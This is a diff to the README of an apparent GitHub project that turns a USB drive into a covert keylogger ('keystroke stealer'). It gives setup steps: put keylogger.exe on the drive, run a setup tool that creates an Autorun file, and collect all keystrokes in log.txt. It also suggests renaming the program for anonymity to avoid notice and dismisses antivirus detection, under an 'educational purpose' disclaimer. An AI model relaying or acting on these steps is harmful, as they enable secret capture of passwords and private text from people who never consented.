@@ -1,29 +1,21 @@
 # python-usb-Keylogger
-#### A simple project for turning a USB into keystroke stealer. 
 
-
-
+### simple project for turning a USB into keystroke stealer.
 ![maxresdefault](https://github.com/tribhuwan-kumar/python-usb-Keylogger/assets/118052427/370777be-a90e-493f-9dd8-735d90dcd5c3)
 
-## Deployment
+## Setup:
 
-To deploy this project you need a USB drive
+To deploy this project you need a **USB drive**. 
 
-```bash
-   copy and paste keylogger.exe file in you USB drive
-```
+- **Git clone** this repository in any directory of **USB drive**. Make sure `keylogger.exe` file is in your **USB**
+
+## Installation:
+
+- Run `usbac_setup_smof.exe` file in same USB drive directory & Set the location of `keylogger.exe` file. (It will create a **Autorun** file in that **USB drive**)
+
 NOTE : For the anonymity of program rename the program as you want.
        It can be detected by anti-virus but there isn't anything malicious by nature.
-
-## Installation
-
-Install usbac_setup_smof.exe
-
-```bash
-  install usbac_setup_smof.exe in your USB drive (It will create a Autorun file in USB drive)
-                             
-```
     
-### There you go your USB keylogger is ready. Remove from pc and plug it again. It will store all keystrokes in log.txt file
+### It will store all keystrokes in log.txt file in your USB drive
 
-#### This project is only for educational purpose
+#### This is only for educational purpose
